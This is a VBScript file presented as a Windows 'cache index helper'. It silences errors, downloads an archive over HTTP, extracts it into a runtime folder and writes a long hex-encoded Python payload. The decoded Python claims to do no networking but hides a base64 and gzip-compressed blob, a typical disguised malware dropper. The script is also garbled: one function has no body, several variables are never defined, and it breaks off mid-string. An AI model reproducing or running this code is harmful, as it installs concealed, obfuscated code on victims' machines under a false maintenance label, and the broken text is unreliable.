' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - embedded hex always refreshed, then repo fallback
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
Dim e
e = "2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d206227397a324d55694475764970634a686d2f6153454f73325a7869383958666d465568656139614f4d4a5252665171435a75394d766e594d6544443739384f6f55327363336e6371646f4933574659317847413764387837734c2f77784f766d45795636377841454b57706a3967376d732b31376b43462f524a79363471594c53354a55795a54667369756c4f582f303670355777337a344870616e3639333174446f466c78784d367043384f7430476a6c57704444754a596170434e2b6e6f65" & _
        "4e2b337361345a2b703570394f65545a566d305044425662586d516e75364f2b4765487037446b6671325568377a32314a6831487878466858573136392b54486d7a6d63624b533737387a594f596675664a754f79444b4d465a6d6c4c4b5549776577456939662b2b77523131334853766b6c46684d4875764f7a304536463842455146704672347444384f454669394669364e683667564f412f5466666858484b3957495a43503951596330747965746b664546354d4b66754e534c56397730543871445179356c67482b4c4c5147784c3961385278646c6b5339745171506d6b445554355a335449735a54716656367a3365444e545666562b425873424c504456747a765368376e6e554c5775694d616364524c3970776b563637574b4c6c6a70514f58385972304e6e736f33652f57315474395643675957463672782f5a504553697878464745436d2f55386d64495061715a2f2b6157573255315238674b544b75795342336d385352732f686246594d574453385638514678784f6d343572414a736d4d344143693249396c676e4b2b5a3363754a665244733254554462436747746b305374387a656f52556f376b64584b5168577a474f667378473645" & _
        "6f2b75334765386167516c4a67476c3845754545384c476b6c796867764c3479305a517a52676257393945436d31594d73434a7a47554c4c4f4f3555735a5a59586834394230624672344546516473597a38426d4454654a634c6a5a526949384237726c564a452b6b4451556f6245493444473878423642565846516f65505862324f53396d45684b5344644450537a553571306d6d3039794f4c38797a69645153576f45484c663077415873325836516f49423078503047382b6f4833384b495a6b737957434b4b684945636e68626a73386b694d33744879542f3247356447557377657855784b564a5348654c644754655967494d303467576453453679485a6251715164355a41643631795a304256746d5472325031535169636d537473636b51304c59427a6e6a71446132592b68453734556a5a7265306672546147526b707a73465a466335436278426c6259585a50704856594a69694c7062656c4b5a48774e72623762664c38326e4f772b546d6f57734f3042443358496f576e5761374d46792f2b6f535a526656314b4830386756712f524461456f387a3766527559423172715841764f444464747166774a38483976424f59595236366a616b57" & _
        "6b4b75414f7959303239352f7233746f63436e363174666559646c67612b7a6469796a316a693467494d6a5374417175755175444d35442f56374b786a2f65656b6c46304547502b39734249457877534b4b2b4763755357614a7a713337783861686a706d447a67546744502f6d367a586d3363344645596252423769313949787a73464737412f593950546b5463524c47476e303432485654454e77466a51746f4c4d697a75655a574c4e6a78536c426d763479466334673136467965725556452b4e6d46346665466a45524b6c6b633353374733444c54622f4c4c2f67702f3842703072486b6376356a584a54352f697254716e7744674c496d7353442b7159527a70416973434a722f45676e4c6551637053766a7077696b494a6752436c554c7648496e46392b4741347a64732b30666f317275346b442f57636a3466476a6b41367654642f49746c73667a6f68335031576c56522b4444347633647a52703346314c63464b4f6369724d6b424759674b615a4d72546a725a715a335267516870456639714c374f3653706f596861596c58413248754e4256413133346f4e7141635639416f6375306c4b7443355930764e4f423359717867673852575375" & _
        "727443413874666178444b7330466f762f73735456474c4869372b6345623646334a6c42346378564f59586947322f6e48335874764947653043723042614556457269506170616e70446346507950577a4b55717a737577376f3437714a694b4276644a4f396b675763326b43673432676a4e556246564e4557664e4e4a664576477251743559317a6179346b617775474a366e423852434872345363514d376555314e4c6c686947636a34314f587348546d6d4e52346a46772f7a4d7930767a726d303663434e48596f334d464e346151724a48686e364d34536a4166554d575964523471304c3752437a4659654f7167633867663233434371422b656779704735324d7464317a644b427849424267374e507179503966476a6c6e3266666f3932347164347a65344467772f434765366c685a68757151544173547044743637644564384e4e6d396369784b3431464c492f5356516c59455668566866646836525739332f51626c62387a37387374435a5942367a6c636b7248393154726c75666374547959534d767171737841335741546f7347322b4e6268665035484171582b574d784d3876456254444c67784a535838576e455347352b37677a6a526e" & _
        "594a792f686465545a4c4e5a6a524e4270736c575678525a367758784b7832314a6b38626b59394f394c37474a5837367a63516b5343536b766f7a556e346434375345786b50634c4f4f79746177746275372f7852613841416266413965346e5137367652415278384d394d4676616c55457a642b553235425a634c7550356f62716f61467371344b6b63495a3978554c4b32654c51306e5638346865785133694e7939473248715a68786e35624d477a36512f5067496f76664d336e556958544d7964463238366c476e343447644a3265424d6e647169306d43566a482f2f5a433332734e5536736a544255332b33636762504b4d43454e4930462b343654376d6b6679323734564b654278637a383967646965327730785a555a703345624647575264425a6375717447312f393970512f38464e5472666c635a75446f6735757143574363554b763633464c6c2f6a69776d61706d4532415a74694c462b5163445639477a4c496e3151763065344a2b46454166345457754f304e6e6c2b537a6d6532366435525a74737949456171454c52556b635a592f74314a556545375533597a39626974767a3468374d507337523950316752574b376d443567784d39" & _
        "6f42452b78544f6f66722b547865674c61796c7a374f555a705a743661663063656b33526c762f513541752f643535577a4c504842473372546d75356e65394b516c70393158424168713568705879576177314b54745873363050506b684167716d6b49783735786d2b54784e63722b54434d4a657a464e685252724679587a50446857554b354a65487a56337974493658646e583646316e684a664f324364446c4376556e7643794c31694f774a356d7935385873486d716d507a4856616f514d4867776c4e4a2b766d6665552f4f792f59775638564e307537367a3874502f4531624649645939446d304964662f38497548723752793074533236394a7166592f474f5739696361436d4b73384261354e6d7a637963716959413136544338547632316c4333326972335851566b32457a4c4d6c2f4950457936544d3956354f3076707464767363537051586c64753354454f697670737a4c303563344669423877663554766f5279384f70783337372f663863504b3433594c593856666656787570636147685268786542737142576e6e746535794d314f34586b43327a666878554b7a554b7579446850624c336947783042545835636250512f41763165" & _
        "47472b3771624376316e337939664a7656376d396f4a2f534b456862545537624c4250304b6a546a56424f685176527a3046336a61356c387777476a526974327142766e766e305a715461496e5051782f70504d436a34576b4f54754c63384b616a6859594a50786c793148506274642f6f4d72544d71415545704f6556542b315450543832633434654e422f694c366556584e502f5230732f627153354462526e626734664368693973786b6558434e6c7344394970434a65472f4a5849506c54546b6d54394f4a465031763738586757347561594f4968514154336f796e6f534136776b335177555a755064326436517349614334497643682f307a56783638416159664a715662376569656a776e5870664c414554434746784a6d63364c37725458326d4b50387164686539302f4d594e524767736872725152742f4170324e427a73706442597a36495273436858384f5749796f5a476a53466b312b324775522b70524c695749326f42426a596a3765726b566158687666394a5656704d752f4872584c76674e7951675463556241332f35423176434766316243316535457454586757554b6868366c4c783533697377746556454a43514174336f456a" & _
        "303270504b746f5a49744b594d676b5538394438356f4456707130595a545866532f476b6d6e762f7356466632313154776c7542394f6175337230515052587237636b777875467756565466454a6136562f5a67566b4679354335304961684c5369556c783545344e504544466f535274785475576d755a566678694a5a454442396e61434f3951474f646c6f33524e51467745705a47392b4b5936523474513974663135755647544236625a47574d6d74746d535876462b65692b664b525334314e4974484f34646a497565304471556142586b505630414c646c7a3354394e6843647466354d472b37767a6a6e4344596c797130305562683951644757574950373634527a414e6663343257587345346f3052424a567668346557396f3052596d377472784950665555436d6b7a6566656f725148394c78676d4e59385471676d33724642506e6161367176786c36556c706257416566355630694f436c45467354664359316a706f6278646c343971676e2b5130313671726a7850393334794e6f435349415a2f4466695858386f3358574c764e374674547950523979566576763076487366796434545478635237746f31472b42684b7448416668553143" & _
        "7470616b47466447764f38327a585743377a3452587a726a425a5574326f61744278504349513678783052726d64447872584635335a46516266623049415350795767457444644a6f717a2b4466324846356e6972684e39632b62433143336c6b53474e54625664584a576e7477304464527a6b2b63566c525370536344644455463462726a665274505370354e444a6c752b6b35554663523137463151664a4967594d59357367365445462b6b366c467376332f4e77632f457334574752353645646d694d513841665a3246374852525657505a4e496932554234526e384c4656342f5a565163686d386952326833463448675a71426d46596b3233304236322b304b6b6633656449394d2b5476384949414d6b6864727939504c6e4d3574622f2f4535536661775a667248566b56564d6d6c4c776463554b2b4570666a4379474b7748586b466d7a53614a565370632b766f6d3762726b6578356e323965335069534546487274384478715652584151796f473649756b323553306c744f6263464f35615271615253394c6d38336c42676b313868346f2f6c575454705050374c7253354b4a376a344d6e6c63496a7851426b4f426d54456a354f5769315369" & _
        "544a625a457135336a5172644370484354426e6a386577346e644c53476d68553030622f55506252306c322b654d356a6a6d64514853654957627662676f5750736c457632734479615542476e7678524a7a4e755236372b333437694b55683866344f6d787a7864535a56505a5278383062657a522f717a6350765243427645336c6e44616869335a3433794a736e303330646a304e5230383433417964674467476b4753616d4476686e5565653855622f35684f3551526e30436355785a50744c6e516278524951747968566c786138614575754e6a55304f64356b712f4b324e7577373368722f7966314c326a3047506f4a2b2b45596266366e4f7539615863336a5a2f42317a675654345544507656586e65526b6b674c5436304a70644644767050614e6d52753770354952316550716442342f4258795a666f64354a5542317232553936306c33347a2f4a4e5a38356330564d3776784250553643386457303736367347346264772f5638685574776f4d77465a6651394c4f34524b78656b3654665657636e534d53717850556d624141732b4d6f38646c51706a6c74555262394f5a6c31673771557a746479587a77626352523965534d534131334159" & _
        "46594c58635a324858472b5861614a674c6d3670373075583868496e6d52304f764d433137574966595536506e316d4f2b4c42762b464663615146313533624432375a304166536372377339576f7758326a596d6d3030703034484c394e76424b7430516d49326d5a76394566506b33486c4f426b34574444355234443270336b6f3976494b73336866344d364c74744a4e477431384d77584f4a6f442f674d7335663048446a7a45384f6f7450324d65795857414c66785a506b424b4b67764c6c5275686c6b6c7450597351526636496b2b2f33476e5641797668502f6848476a582b51553542336c35704b6c4f6f785a723635424c564b497372796a575448694a376b44727a7a426b6f363532515a766169754930486e577975657a355144492b363451596d6f67583267316168567179477736496d326f4d6c5750337a65626a5475466333504d784f4e3345566e6a4e314a336e73594431666d7368524a75706643592f5975394e7673764c6b49425a627038533135765a4e34514d45704b50706661456e4448427633737031487745742b38326e5455665042696c443567506673716834396b526c7a58596e7a434d326b5253777456796b766a454e4f31" & _
        "594c784b4d666666754d50364b6d6f574e79744973476532477564304c68544d46304c3654592b4d79764c4c506a492b654b7a424e572b2f5069545349435a6c42486c622f354d4c704d573769704e725476385644317075524e6635356350696164512b38577462444d5a35387258365354637266556b2f424c465158496a6b31627759364d473977336c2f774c76347a30447744466430574b686858773952652b4c4e524e335738564a74734f54534a666a4467754464347a657a424f622f4c336b70596b2b2b2f754d6555483266364c5653415733597a755045752b496e65593737304d4d78576a7858645a50706b34557532517a4d41416a387935666d63556e7771464166473651345654614450396d7378753379526e735778564261326b6c53464d6b5a3544666a6a497648702f794e50347a74443272573632487a59444c31466a3641464958566e2f546c45704c567677534a5868456a77445856572f776a6969335a466838307730564b5a485762366f465573634c49576f365551592f6d4732694959772f4d52353573443779543244663231515634734137765438373371425038587a747a456b6b2b5157524a6a4f5958487a372b463448426e79" & _
        "4f32385a7359504f2b2b3176784d6e4a6c79434a66644655666a354e43734c33666138754b677a345647754e474c41632f61354a6a6f5842683863327977644e433764335948526d58544849724c6866716f30317a48597956506f74443647325362422b4f4270394848716a36334f435a7977634b37517149747a764a593265617078334872582f69544257667762656b31593351636e504754302f31484c7439504d384f4538492b784871667a5a6543717234332f39792b3432787833477341665a5837745878767776647158466a536c7355726b6b6e776d72704b4973585457775164493853424a4a4e2f496230416971645459794e56387738357a7057392f6855652f7338463668766d624d50424f456455362f46707847587741514d57336f2b57357a6f35677957356d7534333635646e5373643830754e6d4a7a36343273395435656c675968556a693263775a49577a43322f596d30514c4f506752792f59363870764a3357722b7a653663736756476d65497444465850305053677952322f4c665054794e716843772b4e6b2b636b4241766c58423545467346415a4d713872414d5a3239694c7051317a553066725572473773712b636f77615a72" & _
        "7a6d794a777344687a432b443871466e43636d2f476d41566c6a50474b4e625068504e3874654e3341707666472b6368506336694c4f564a3350736c676c492f37526359724d37643935445a7730415833634a5555422b4f44775a2b3561362b46424a447555564d7438304b68384f6d744b2f7a3052576e62532b74584f32584a624c674d646e30462f484750586139516c476c4c4a4a646471646f776d617854446c75766b565475473034797a44434e5a474676496c584b30374e53434273714c7644654667525454352f4f6b49746559576c36494139332b676850386f512b6d62557574576837552b514255566a6e6477436f4176424f414559564451734c7a69476173564a7449582f426d506e424d4a6b6e4772446956334e444d6a687542316b4f54466337543766355768632b7a64524d6c334f666b684e6c737a62645a787836647477414e377070664c7657646732443858456e30786b517a4b62744363444c4a557568717130556668704a6c49434f36666248325776416d784668734a4d39736c3958546c48674d3659512f697a67544f55596962584b41794e727678495530415871444c51375a4c3230706a696479647575434e3963615a59306d" & _
        "68416974444a766373474648497861685950414842666945655468526d613536583754544d476c4159322f56762b6a36546b52365a7a4c524f32393967672f4d77654364394376676b562b386334583067654462506668465451656f3345625032735968466f4542636764313859394a6e52774937364c6936717473347456784f7a67444a453157595a674f68433634785373445743785465532f2f36466735744f5961564a722b71784f7266626e6a576b7237586a4d4f666878676f694e71335253446a706d6276694d2f37545053373055694b664c663552724a6b6b52734758346179767644486a535353394562766c575a366f45566f30634b2f6f55414e496e4b4b75744a59784a4249384e767250543352534d614d7470767977474b6f4d6a7630586751337642796c4c372b307a3171476161727778426e79696572537a6a335969737450736e5449645a2f675458384437517941694c776e484c67496661732b7a67504d744354646349502f4852302f574459394371504b524745774d4a676a635670426e6130327070794448794c412f683737712b545741582b52743949616a50756c38576a3572696255747233556e4e304f52546e65745a757930" & _
        "6e4a49382f425136504c546e364d6d616b54794b384475656e383668364c4b72482b345a4f4178412b656575385273777a6f695a3939436f48705a526e7359534861496968376254565551354a3243414f676230712f322b4f6646574a574331674d6f76414a444f3647754567486137615253787a663764746f6278527a4b3632553175705639563544304b326378484873612f5567486f3479724c77527a6e306b7a414854726c53626d454e51312f54656f4a4e2f6f436966383773577976696a65764f4b7433704e346441496c542f474b4671664170462f3054475236786d6136736561455149756c4c6f452f634535655867713466764379396471636f686f57437159595954776262674334637a4462634e4a72726c6145674a4e46743954387031744e2f73567143417570316c31516452424c4f5471706c4e74434a6d4a446d514d2f4d364c45692b39516847343375385676654a5250787342307068642f4e462f3341413873646669383932546e6466547752776f58776343614c4737755251536463656b69556e73306353593241727a646574353151487274435839673267786d3377626e416c61554b6832784261654a7769426359554879496954" & _
        "724963784231385137532f2b7056796f6f785a4a316f6e4a77724d7668377a33654e71796e36712b6e546936484965636a6d796575536466463464384d457a6a696d596c547533676f6c6d452b465a43474b6e592b774c786c567537494175553877655175514d6f43535a347652734e434577654949397165794d63507868552f394c4b73586c467a66796a467836396e656e435556486b32374e503665543852414c43694570706a616b364667314c5677646e54366769797661354a47383770473547443062572f707a474537775a36414d6467316c72436a6c5230696e59574d435a6969682f46576e3179546c427471667864523651485a694471424b635a69494f644d652f4867774b437a516244536f42345643474d4d704c6155535359467164444d6e626c4c67685265366b6946412b634d433536545559566b307a364571756e6b4e372f39616e6537755a336b4152675a6a7a6e757a47556875536345305743616561556e72734a434133496f674f7173774d566e5747366d684d6b2b466f386f764d366c6267435246456d62463234614a787a2f6962457150334b72685a66324f38386564594f514766453776557273552f31723964727433424750" & _
        "673575666c53386c7043596f4175776f6c56773430754e4d4d596d786f6c3778644165464f6446763930677a427067654e72676b2b5836776e6c70713675504f336451375052535873774d376d326f6e67385a38713450646634707079692b4b6e76786d4c644b6e457230364158474845552b382b446b54474f57436b457541365a794e573049446c35712b76724645762b52483858754979564c39536166494538563535556d6e4f6c415a4975436d466b454d594e2b7373364665306b4f594156533275675a58716e784d66533062592f426341704f5671347074556d564f6f4c5076734b79736f5a2f33523051717a4a356e304a416a644a7051634163305a444d727267304d4f6d6231436e45375673416a686d5165356b532b5450684a444968684676697865444b6e6c544f54644d47742f75796a634d727367476d615561796e41484c3168753170374134376c377347753938382f6b4b304c3467704243415856656e3671382b6c464e4a586936327a5871613952544b4e7a48637a566e6a79324c325a75444463516f7a566d7567453247684d6f426f33775631716a6645685768707a4a3258374a6641534868592f774f766b76796e6434776c657133" & _
        "32494a5650704754556e55542b41315947336e47597a337170426e4b7947696955302b78553339717a545a746530514f687669507665743766417030495748524874716a4e3546714f6a327449517579616e73787942516254374d65505871754d506b7a4f554b4b416342572f674c55664571564131664a3153756c4d51533947495044576a754561326b67346f41673459726278764546456671763973785251535068574a716f4f644d6856536379566d564831374a397842783475307858505278384a724f5a493236563359333254517833696b6d46314d352b367a6676765278385958775244326f612b364e682b385571415248734c4441443465686d37794568422f714b78673342314c52384966434d7a6c366b73416a326c424461635163786d6d41784c66336e4d6a6f766571747a38714c504b544f556f32313574436b6e4a55496b59494c49676e5636426d5854424a2b526f66384f356a6f2f6838504b447855327734474d6b463244766c684363647346304e4856777338345841334378595739466e73566139314161316a6c76624a6f31654464326d487a497a486a376d62484763326a6e716b6d617833694852414854356451633777534450" & _
        "77307651556e72647369533236755a46316c50503932513761496d354c656731654e6d6c74315041692f53714a5477643176794547707353583957326633535031466b46356c4f526136734a4b7973474e524c74545536554a6c595a3945773279336770303272443851576e636b6665663474634c7471614c7a4c6f5a736a477254377a6f434b6f7969536a51332f75627a65396f467352634a566159706e52424d7653646e445552684a6d726f59357a5368747449784f304f4a6c6e5631786476757661377142656d793261417a693261796f707a6737397a3853676c395165576e324d336a3854706438496532356351574f4a363136796765364c42743174415946643242704a2f7935704b6372565233346a6b79504f56783442784e5847514f6e4c79514259712b5a6a486961764b45543853544a6d705a445857446e374a33454e53466f316c47324c333876324c694443525a6b484c434478612b4b39494a2b42416275696f49343050713851734647517134696d47797773664e49545a44304f304a6e36655557456f2f5455586e5657766f554e53516846562f4835425270436c366753566d624879614a666155653453382b756d6947326d66346746" & _
        "527471746a463155526a316c4a75517543646f656153326a5a397969346975644a614c7046616d304b2b54534b384b6574584e55484d59516654716e30396467773078394f39564f594b6f58496b717451634667436979776930615271622b6e7439706e6e507278356b44316156506b6d67502b48414c54567378555037686c6a734f4f6d6a5a5a65422b6441326d2b496d4c50686373465745572b484849732f6535347743723142664952664c3366626e6175454173436f6476364e794749744b42687a4e794335556c793463544641354576686d7361694a6d53494f564f53364651796a7345333156347672676c4f704c70546b62774e41636b4f546d6c536464537866447a5573367748382f784947586656737473524c65324655454f584238544d6a3937616850442f4251746d6c6f6f71544963755a544e576d54525a526b4b705a334a48504f694d43456e7036756961617766776b396f6d5054777554636e52747a4752382b6535772b33547634376762546c67626950546871416e3874545064645344454e646149795644705253306a65694443773645714a6a4f764150426a754b6a756a4c4a4a4553657261543865506d4b30385859486c516a51" & _
        "4e383137377245784f676153596242654350646b376d7a71775a414c6c637374596f357644476b7968756c545a446d664f47437438594c5a472b4f5843706474756c616b624c446c4d316e6d757869546a344b304b3468634d4e73506768766f437432355335584132634d7458494b7270617a6b627a34454545614772722f32496f4256734b5151383557676e36555353444d4553724d7057366a7455374d7655536a4a492f6f36587551637772586e535a4343626974323463327a36625676675838383353743239394867683449517769344c736a2b41316d455566552b576a7055747a716b564d3772486b6e71734869736f786475756d6f364834396245476236706b4e624d4b5331424a3633357737633042466869576f744e436271717561384e466149654671384b6c6833652f443062553550336e55383530526139722b2b634d70632b767562756c6c6f4d694757596a622f34306774577649344736667765624a5137344d785941354c41487344375842356c6d6a5050473658616c7a377638396852737675306e7163526e58465a6641474537436178496f62366168544c353870475071666a4c743245486c7a6d762f305764645779704151717642" & _
